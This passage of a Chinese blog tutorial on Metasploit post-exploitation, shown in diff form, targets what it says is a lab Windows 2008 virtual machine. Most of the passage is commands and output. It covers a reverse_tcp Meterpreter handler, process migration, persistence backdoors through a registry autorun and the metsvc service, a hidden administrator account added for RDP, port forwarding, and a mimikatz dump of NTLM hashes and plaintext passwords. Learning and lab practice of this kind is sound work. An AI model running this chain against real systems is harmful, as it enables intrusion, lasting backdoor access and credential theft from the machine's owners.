+<p>msf exploit(handler) &gt; set LHOST 192.168.111.129</p>
+<p>msf exploit(handler) &gt; set LPORT 2013</p>
+<p>msf exploit(handler) &gt; exploit</p>
+<p>然后在Windows2008上执行file.exe,返回一个meterpreter</p>
+<p>[*] Sending stage (769024 bytes) to 192.168.111.133</p>
+<p>[*] Meterpreter session 1 opened (192.168.111.129:2013 -&gt; 192.168.111.133:49168) at2014-03-13 22:23:18 +0800</p>
+<p>meterpreter &gt;<br>(2).转移meterpreter到其他进程<br>在渗透过程中由于各种原因，当前meterpreter进程很容易被干掉，将meterpreter转移到系统常驻进程是个好主意</p>
+<p>meterpreter &gt; getuid //查看当前权限</p>
+<p>Server username: WIN-K30V5SI0PCEAdministrator</p>
+<p>meterpreter &gt; ps   //列出当前进程</p>
+<p>Process List</p>
+<p>============</p>
+<p>PID  PPID Name       Arch  Session   User              Path</p>
+<hr>
+<p>0   0   [System Process]     4294967295                </p>
+<p>4   0   System      x86_64 0                    </p>
+<p>244  4   smss.exe     x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32smss.exe</p>
+<p>264  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:WindowsSystem32svchost.exe</p>
+<p>336  328  csrss.exe     x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32csrss.exe</p>
+<p>388  380  csrss.exe     x86_64 1      NT AUTHORITYSYSTEM      C:WindowsSystem32csrss.exe</p>
+<p>396  328  wininit.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32wininit.exe</p>
+<p>432  380  winlogon.exe   x86_64 1      NT AUTHORITYSYSTEM      C:WindowsSystem32winlogon.exe</p>
+<p>492  396  services.exe   x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32services.exe</p>
+<p>500  396  lsass.exe     x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32lsass.exe</p>
+<p>512  396  lsm.exe      x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32lsm.exe</p>
+<p>596  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32svchost.exe</p>
+<p>656  492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe</p>
+<p>748  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:WindowsSystem32svchost.exe</p>
+<p>796  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32svchost.exe</p>
+<p>840  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:WindowsSystem32svchost.exe</p>
+<p>856  388  conhost.exe    x86_64 1      WIN-K30V5SI0PCEAdministrator C:WindowsSystem32conhost.exe</p>
+<p>860  2044 cmd.exe      x86_64 1      WIN-K30V5SI0PCEAdministrator C:WindowsSystem32cmd.exe</p>
+<p>884  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32svchost.exe</p>
+<p>924  492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe</p>
+<p>972  492  sppsvc.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32sppsvc.exe</p>
+<p>976  492  spoolsv.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32spoolsv.exe</p>
+<p>1056 492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:WindowsSystem32svchost.exe</p>
+<p>1092 492  vmtoolsd.exe   x86_64 0      NT AUTHORITYSYSTEM      C:Program FilesVMwareVMware Toolsvmtoolsd.exe</p>
+<p>1332 492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe</p>
+<p>1492 2044 vmtoolsd.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:Program FilesVMwareVMware Toolsvmtoolsd.exe</p>
+<p>1560 492  dllhost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32dllhost.exe</p>
+<p>1640 492  msdtc.exe     x86_64 0      NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32msdtc.exe</p>
+<p>1968 492  taskhost.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:WindowsSystem32taskhost.exe</p>
+<p>2024 884  dwm.exe      x86_64 1      WIN-K30V5SI0PCEAdministrator C:WindowsSystem32dwm.exe</p>
+<p>2044 2016 explorer.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:Windowsexplorer.exe</p>
+<p>2204 2428 mscorsvw.exe   x86_64 0      NT AUTHORITYSYSTEM      C:WindowsMicrosoft.NETFramework64v2.0.50727mscorsvw.exe</p>
+<p>2312 492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32svchost.exe</p>
+<p>2332 2044 file.exe     x86   1      WIN-K30V5SI0PCEAdministrator C:UsersAdministratorDesktopfile.exe</p>
+<p>2428 492  mscorsvw.exe   x86_64 0      NT AUTHORITYSYSTEM      C:WindowsMicrosoft.NETFramework64v2.0.50727mscorsvw.exe</p>
+<p>2588 492  mscorsvw.exe   x86   0      NT AUTHORITYSYSTEM      C:WindowsMicrosoft.NETFrameworkv2.0.50727mscorsvw.exe</p>
+<p>2972 492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32svchost.exe</p>
+<p>meterpreter &gt; migrate 2044 //迁移到PID为2044的explorer进程</p>
+<p>[*] Migrating from 2332 to 2044…</p>
+<p>[*] Migration completed successfully.</p>
+<p>meterpreter &gt;</p>
+<p>meterpreter &gt; ps</p>
+<p>Process List</p>
+<p>============</p>
+<p>PID  PPID Name       Arch  Session   User              Path</p>
+<hr>
+<p>0   0   [System Process]     4294967295                </p>
+<p>4   0   System      x86_64 0                    </p>
+<p>244  4   smss.exe     x86_64 0      NT AUTHORITYSYSTEM      SystemRootSystem32smss.exe</p>
+<p>264  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:\Windows\system32\svchost.exe</p>
+<p>336  328  csrss.exe     x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\csrss.exe</p>
+<p>388  380  csrss.exe     x86_64 1      NT AUTHORITYSYSTEM      C:\Windows\system32\csrss.exe</p>
+<p>396  328  wininit.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\wininit.exe</p>
+<p>432  380  winlogon.exe   x86_64 1      NT AUTHORITYSYSTEM      C:\Windows\system32\winlogon.exe</p>
+<p>492  396  services.exe   x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\services.exe</p>
+<p>500  396  lsass.exe     x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\lsass.exe</p>
+<p>512  396  lsm.exe      x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\lsm.exe</p>
+<p>596  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\svchost.exe</p>
+<p>656  492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:\Windows\system32\svchost.exe</p>
+<p>748  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:\Windows\system32\svchost.exe</p>
+<p>796  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\svchost.exe</p>
+<p>840  492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:\Windows\system32\svchost.exe</p>
+<p>856  388  conhost.exe    x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Windows\system32\conhost.exe</p>
+<p>860  2044 cmd.exe      x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Windows\system32\cmd.exe</p>
+<p>884  492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\svchost.exe</p>
+<p>924  492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:\Windows\system32\svchost.exe</p>
+<p>972  492  sppsvc.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:\Windows\system32\sppsvc.exe</p>
+<p>976  492  spoolsv.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\spoolsv.exe</p>
+<p>1056 492  svchost.exe    x86_64 0      NT AUTHORITYLOCAL SERVICE   C:\Windows\system32\svchost.exe</p>
+<p>1092 492  vmtoolsd.exe   x86_64 0      NT AUTHORITYSYSTEM      C:\Program Files\VMware\VMware Toolsvmtoolsd.exe</p>
+<p>1332 492  svchost.exe    x86_64 0      NT AUTHORITYNETWORK SERVICE  C:\Windows\system32\svchost.exe</p>
+<p>1492 2044 vmtoolsd.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Program Files\VMware\VMware Toolsvmtoolsd.exe</p>
+<p>1560 492  dllhost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\dllhost.exe</p>
+<p>1640 492  msdtc.exe     x86_64 0      NT AUTHORITYNETWORK SERVICE  C:\Windows\system32\msdtc.exe</p>
+<p>1968 492  taskhost.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Windows\system32\taskhost.exe</p>
+<p>2024 884  dwm.exe      x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Windows\system32\Dwm.exe</p>
+<p>2044 2016 explorer.exe   x86_64 1      WIN-K30V5SI0PCEAdministrator C:\Windows\Explorer.EXE</p>
+<p>2312 492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\svchost.exe</p>
+<p>2428 492  mscorsvw.exe   x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\Microsoft.NETFramework64v2.0.50727\mscorsvw.exe</p>
+<p>2588 492  mscorsvw.exe   x86   0      NT AUTHORITYSYSTEM      C:\Windows\Microsoft.NETFrameworkv2.0.50727\mscorsvw.exe</p>
+<p>2972 492  svchost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:\Windows\system32\svchost.exe</p>
+<p>如上所示file.exe进程已经没了。需要注意的是如果存在杀软的话可能会阻止进程注入<br>(3).测试是不是虚拟机</p>
+<p>meterpreter &gt; run post/windows/gather/checkvm</p>
+<p>[*] Checking if WIN-K30V5SI0PCE is a Virtual Machine …..</p>
+<p>[*] This is a VMware Virtual Machine</p>
+<p>我的2008是装在VMWare上的<br>(4).安装后门<br>方法一:persistence方法</p>
+<p>meterpreter &gt; run persistence -h</p>
+<p>Meterpreter Script for creating a persistent backdoor on a target host.</p>
+<p>OPTIONS:</p>
+<p>  -A    Automatically start a matching multi/handler to connect to the agent</p>
+<p>  -L <opt> Location in target host where to write payload to, if none %TEMP% willbe used.</p>
+<p>  -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp.</p>
+<p>  -S    Automatically start the agent on boot as a service (with SYSTEM privileges)</p>
+<p>  -T <opt> Alternate executable template to use</p>
+<p>  -U    Automatically start the agent when the User logs on</p>
+<p>  -X    Automatically start the agent when the system boots</p>
+<p>  -h    This help menu</p>
+<p>  -i <opt> The interval in seconds between each connection attempt</p>
+<p>  -p <opt> The port on the remote host where Metasploit is listening</p>
+<p>  -r <opt> The IP of the system running Metasploit listening for the connect back</p>
+<p> 执行:</p>
+<p>meterpreter &gt; run persistence -X -i 10 -p 2241 -r 192.168.111.129</p>
+<p>[*] Running Persistance Script</p>
+<p>[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-K30V5SI0PCE_20140313.5419/WIN-K30V5SI0PCE_20140313.5419.rc</p>
+<p>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=2241</p>
+<p>[*] Persistent agent script is 148439 bytes long</p>
+<p>[+] Persistent Script written to C:UsersADMINI~1AppDataLocalTempUhyxOTTzTb.vbs</p>
+<p>[*] Executing script C:UsersADMINI~1AppDataLocalTempUhyxOTTzTb.vbs</p>
+<p>[+] Agent executed with PID 2916</p>
+<p>[*] Installing into autorun as HKLM\Software\Microsoft\Windows\Current\Version\Run\HstWtPyXHYnhQ</p>
+<p>[+] Installed into autorun as HKLM\Software\Microsoft\Windows\Current\Version\Run\HstWtPyXHYnhQ</p>
+<p>现在退出服务器,重新配置监听器</p>
+<p>msf &gt; use multi/handler</p>
+<p>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</p>
+<p>msf exploit(handler) &gt; set LHOST 192.168.111.129</p>
+<p>msf exploit(handler) &gt; set LPORT 2241</p>
+<p>msf exploit(handler) &gt; exploit</p>
+<p>[*] Started reverse handler on 192.168.111.129:2241</p>
+<p>[*] Starting the payload handler…</p>
+<p>[*] Sending stage (769024 bytes) to 192.168.111.133</p>
+<p>[*] Meterpreter session 1 opened (192.168.111.129:2241 -&gt; 192.168.111.133:49159) at2014-03-13 23:01:55 +0800</p>
+<p>如图，反弹成功，这个被动型的后门在某些特殊的场合会是个不错的选择<br>方法二:metsvc</p>
+<p>meterpreter &gt; run metsvc</p>
+<p>[*] Creating a meterpreter service on port 31337</p>
+<p>[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\LocalTemp\HzWbqqRpuBlxn…</p>
+<p>[*] &gt;&gt; Uploading metsrv.x86.dll…</p>
+<p>[*] &gt;&gt; Uploading metsvc-server.exe…</p>
+<p>[*] &gt;&gt; Uploading metsvc.exe…</p>
+<p>[*] Starting the service…</p>
+<p>   * Installing service metsvc</p>
+<p>* Starting service</p>
+<p>Service metsvc successfully installed.</p>
+<p>metsvc后门安装成功，接下来是连接</p>
+<p>root@Kali:~# msfconsole</p>
+<p>   ,      ,</p>
+<p>  /      </p>
+<p>  ((<strong>—,,,—</strong>))</p>
+<p>   (<em>) O O (</em>)_________</p>
+<p>​     _ /      |</p>
+<p>​     o_o  M S F  |</p>
+<p>​         _____ | *</p>
+<p>​        |||  WW|||</p>
+<p>​        |||   |||</p>
+<p>Using notepad to track pentests? Have Metasploit Pro report on hosts,</p>
+<p>services, sessions and evidence – type ‘go_pro’ to launch it now.</p>
+<p>​    =[ metasploit v4.8.1-2013120401 [core:4.8 api:1.0]</p>
+<p>+ – –=[ 1239 exploits - 755 auxiliary - 207 post</p>
+<p>+ – –=[ 324 payloads - 31 encoders - 8 nops</p>
+<p>msf &gt; use exploit/multi/handler</p>
+<p>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/metsvc_bind_tcp</p>
+<p>msf exploit(handler) &gt; show options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>  Name Current Setting Required Description</p>
+<hr>
+<p>Payload options (windows/metsvc_bind_tcp):</p>
+<p>  Name   Current Setting Required Description</p>
+<hr>
+<p>  EXITFUNC process     yes    Exit technique: seh, thread, process, none</p>
+<p>  LPORT   4444       yes    The listen port</p>
+<p>  RHOST           no    The target address</p>
+<p>Exploit target:</p>
+<p>  Id Name</p>
+<hr>
+<p>  0  Wildcard Target</p>
+<p>msf exploit(handler) &gt; set RHOST 192.168.111.133</p>
+<p>msf exploit(handler) &gt; set LPORT 31337</p>
+<p>msf exploit(handler) &gt; exploit</p>
+<p>[*] Started bind handler</p>
+<p>[*] Starting the payload handler…</p>
+<p>[*] Meterpreter session 1 opened (192.168.111.129:49313 -&gt; 192.168.111.133:31337) at2014-03-13 23:12:54 +0800</p>
+<p>meterpreter &gt;</p>
+<p>方法三:这个是类似于添加账户3389远程连接</p>
+<p>meterpreter &gt; run getgui -u zero -p haizeiwang123_</p>
+<p>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator</p>
+<p>[*] Carlos Perez <a href="mailto:&#99;&#97;&#114;&#108;&#111;&#115;&#x5f;&#x70;&#101;&#114;&#101;&#122;&#x40;&#100;&#x61;&#x72;&#107;&#111;&#112;&#101;&#x72;&#x61;&#116;&#x6f;&#114;&#46;&#x63;&#x6f;&#x6d;">&#99;&#97;&#114;&#108;&#111;&#115;&#x5f;&#x70;&#101;&#114;&#101;&#122;&#x40;&#100;&#x61;&#x72;&#107;&#111;&#112;&#101;&#x72;&#x61;&#116;&#x6f;&#114;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>[*] Setting user account for logon</p>
+<p>[*]   Adding User: zero with Password: haizeiwang123_</p>
+<p>[*]   Hiding user from Windows Login screen</p>
+<p>[*]   Adding User: zero to local group ‘Remote Desktop Users’</p>
+<p>[*]   Adding User: zero to local group ‘Administrators’</p>
+<p>[*] You can now login with the created user</p>
+<p>[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20140314.4134.rc</p>
+<p>meterpreter &gt;</p>
+<p>(5).端口转发<br>主机处于内网也是比较常见的,metasploit自带了一个端口转发工具</p>
+<p>meterpreter &gt; portfwd -h</p>
+<p>Usage: portfwd [-h] [add | delete | list | flush] [args]</p>
+<p>OPTIONS:</p>
+<p>  -L <opt> The local host to listen on (optional).</p>
+<p>  -h    Help banner.</p>
+<p>  -l <opt> The local port to listen on.</p>
+<p>  -p <opt> The remote port to connect to.</p>
+<p>  -r <opt> The remote host to connect to.</p>
+<p>meterpreter &gt; portfwd add -L 1234 -p 3389 -r 192.168.111.133</p>
+<p>[-] You must supply a local port, remote host, and remote port.</p>
+<p>meterpreter &gt; portfwd add -l 1234 -p 3389 -r 192.168.111.133</p>
+<p>[*] Local TCP relay created: 0.0.0.0:1234 &lt;-&gt; 192.168.111.133:3389</p>
+<p>meterpreter &gt;</p>
+<p>接下来运行</p>
+<p>rdesktop -u zero -p haizeiwang123_ 127.0.0.1:1234</p>
+<p>(6).获取密码<br>法国神器mimikatz可以直接获得操作系统的明文密码,meterpreter添加了这个模块<br>首先加载mimikatz模块<br>由于我的Windows 2008是64位的，所以先要转移到64位进程</p>
+<p>meterpreter &gt; ps</p>
+<p>……</p>
+<p>2000 472  dllhost.exe    x86_64 0      NT AUTHORITYSYSTEM      C:WindowsSystem32dllhost.exe</p>
+<p>2264 1832 explorer.exe    x86_64 2      WIN-K30V5SI0PCEzero      C:Windowsexplorer.exe</p>
+<p>2292 2264 vmtoolsd.exe    x86_64 2      WIN-K30V5SI0PCEzero      C:Program FilesVMwareVMware Toolsvmtoolsd.exe</p>
+<p>2520 372  FfBoPtYGlNj.exe  x86   1      WIN-K30V5SI0PCEAdministrator C:UsersADMINI~1AppDataLocalTemp1rad87A98.tmpFfBoPtYGlNj.exe</p>
+<p>2780 2256 winlogon.exe    x86_64 2      NT AUTHORITYSYSTEM      C:WindowsSystem32winlogon.exe</p>
+<p>3028 880  dwm.exe      x86_64 2      WIN-K30V5SI0PCEzero      C:WindowsSystem32dwm.exe</p>
+<p>meterpreter &gt; migrate 2780</p>
+<p>[*] Removing existing TCP relays…</p>
+<p>[*] Successfully stopped TCP relay on 0.0.0.0:1234</p>
+<p>[*] 1 TCP relay(s) removed.</p>
+<p>[*] Migrating from 1428 to 2264…</p>
+<p>[*] Migration completed successfully.</p>
+<p>[*] Recreating TCP relay(s)…</p>
+<p>[*] Local TCP relay recreated: 0.0.0.0:1234 &lt;-&gt; 192.168.111.133:3389</p>
+<p>meterpreter &gt; load mimikatz</p>
+<p>Loading extension mimikatz…success.</p>
+<p>meterpreter &gt;</p>
+<p>获取密码哈希:</p>
+<p>meterpreter &gt; msv</p>
+<p>[+] Running as SYSTEM</p>
+<p>[*] Retrieving msv credentials</p>
+<p>msv credentials</p>
+<p>===============</p>
+<p>AuthID  Package  Domain      User       Password</p>
+<hr>
+<p>0;339062 NTLM    WIN-K30V5SI0PCE Administrator   lm{ 179b3f1af1324ade301c14040883a0d8 }, ntlm{ 358c0a328bdf6b42185ca0a1773fb0be }</p>
+<p>0;593431 NTLM    WIN-K30V5SI0PCE zero       lm{ bc61a4bbe791e26298911297f380ff1b }, ntlm{ 880be0798a0d1caebdf913bfcc28e1ad }</p>
+<p>0;593459 NTLM    WIN-K30V5SI0PCE zero       lm{ bc61a4bbe791e26298911297f380ff1b }, ntlm{ 880be0798a0d1caebdf913bfcc28e1ad }</p>
+<p>0;995   Negotiate NT AUTHORITY   IUSR       n.s. (Credentials KO)</p>
+<p>0;996   Negotiate WORKGROUP    WIN-K30V5SI0PCE$ n.s. (Credentials KO)</p>
+<p>0;997   Negotiate NT AUTHORITY   LOCAL SERVICE   n.s. (Credentials KO)</p>
+<p>0;47971  NTLM                     n.s. (Credentials KO)</p>
+<p>0;999   NTLM    WORKGROUP    WIN-K30V5SI0PCE$ n.s. (Credentials KO)</p>
+<p>获取明文密码</p>
+<p>meterpreter &gt; kerberos</p>
+<p>[+] Running as SYSTEM</p>
+<p>[*] Retrieving kerberos credentials</p>
+<p>kerberos credentials</p>
+<p>====================</p>
+<p>AuthID  Package  Domain      User       Password</p>
+<hr>
+<p>0;999   NTLM    WORKGROUP    WIN-K30V5SI0PCE$</p>
+<p>0;996   Negotiate WORKGROUP    WIN-K30V5SI0PCE$</p>
+<p>0;47971  NTLM                    </p>
+<p>0;997   Negotiate NT AUTHORITY   LOCAL SERVICE  </p>
+<p>0;995   Negotiate NT AUTHORITY   IUSR      </p>
+<p>0;339062 NTLM    WIN-K30V5SI0PCE Administrator   ceshimima123_</p>
+<p>0;593459 NTLM    WIN-K30V5SI0PCE zero       haizeiwang123_</p>
+<p>0;593431 NTLM    WIN-K30V5SI0PCE zero       haizeiwang123_</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/01/05/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/msf%E5%88%9D%E5%AD%A6/">https://h0ld1rs.github.io/2021/01/05/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/msf%E5%88%9D%E5%AD%A6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/%E5%9B%BE%E5%BA%93/9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/05/%E5%BC%80%E5%8F%91/GUI%E7%BC%96%E7%A8%8B/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/14.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">GUI编程</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/03/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/windows%E6%8F%90%E6%9D%83/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/6.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">windows提权</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%88%9D%E5%AD%A6"><span class="toc-number">1.</span> <span class="toc-text">MSF初学</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E5%B7%A5%E4%BD%9C%E5%8F%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1 创建工作台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">2 导入导出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%8B%E8%BD%BDrlwrap%E8%A7%A3%E5%86%B3%E7%89%B9%E6%AE%8A%E6%8C%89%E9%94%AE%E4%B9%B1%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">3. 下载rlwrap解决特殊按键乱码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#win7%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">2.</span> <span class="toc-text">win7靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%BC%80%E5%A7%8B"><span class="toc-number">2.2.</span> <span class="toc-text">攻击开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F"><span class="toc-number">2.3.</span> <span class="toc-text">攻击成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFMeterpreter"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">什么是Meterpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">文件系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">网络命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E7%9B%91%E5%90%AC"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">键盘监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.0.5.</span> <span class="toc-text">系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">2.3.0.6.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2"><span class="toc-number">2.3.0.7.</span> <span class="toc-text">网络嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.0.8.</span> <span class="toc-text">获取敏感信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Hash"><span class="toc-number">2.3.0.9.</span> <span class="toc-text">获取Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87hash%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">2.3.0.10.</span> <span class="toc-text">通过hash获取权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%95%E6%8D%89%E5%B1%8F%E5%B9%95"><span class="toc-number">2.3.0.11.</span> <span class="toc-text">捕捉屏幕</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">2.3.0.12.</span> <span class="toc-text">得到远程桌面</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.1.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%97%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-number">3.2.</span> <span class="toc-text">盗取令牌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">3.3.</span> <span class="toc-text">清除事件日志</span></a></li><li class="toc-item toc-level-2"><a 